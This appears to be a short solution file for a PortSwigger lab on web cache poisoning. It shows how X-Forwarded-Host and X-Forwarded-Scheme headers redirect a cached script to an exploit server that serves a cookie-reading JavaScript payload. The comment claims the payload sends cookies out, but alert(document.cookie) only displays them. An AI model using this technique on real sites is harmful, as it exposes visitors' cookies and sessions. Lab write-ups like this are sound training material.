// The steps below are meant to solve the following lab:
// https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers

// The following hint is given for this lab:
// This lab supports both the X-Forwarded-Host and X-Forwarded-Scheme headers.

// One of the scripts loaded when requesting the home page is the following:
// /resources/js/tracking.js

// Adding "X-Forwarded-Scheme: http" to the request headers will cause a redirect to https://[SUB_DOMAIN].web-security-academy.net/resources/js/tracking.js
// Adding "X-Forwarded-Host: example.com" as well as "X-Forwarded-Scheme: http" will redirect to https://example.com/resources/js/tracking.js

// Switching over to the exploit server and creating a new path called "/resources/js/tracking.js" with the following JavaScript will cause a victims cookies to be sent to the exploit server,
// after switching the X-Forwarded-Host headers value to [SUB_DOMAIN].exploit-server.net.

alert(document.cookie)
